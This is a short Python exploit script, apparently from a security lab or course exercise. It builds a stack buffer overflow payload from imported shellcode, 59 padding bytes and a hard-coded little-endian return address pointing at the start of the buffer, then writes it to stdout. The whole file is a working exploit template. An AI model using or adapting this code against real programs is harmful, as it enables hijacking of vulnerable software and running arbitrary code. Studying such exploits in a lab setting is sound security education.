import sys
from struct import pack
from shellcode import shellcode
nops = b'a'*59
# Start of buffer
addr = pack("<I", 0xfff6c0e0)
sys.stdout.buffer.write(shellcode+nops+addr)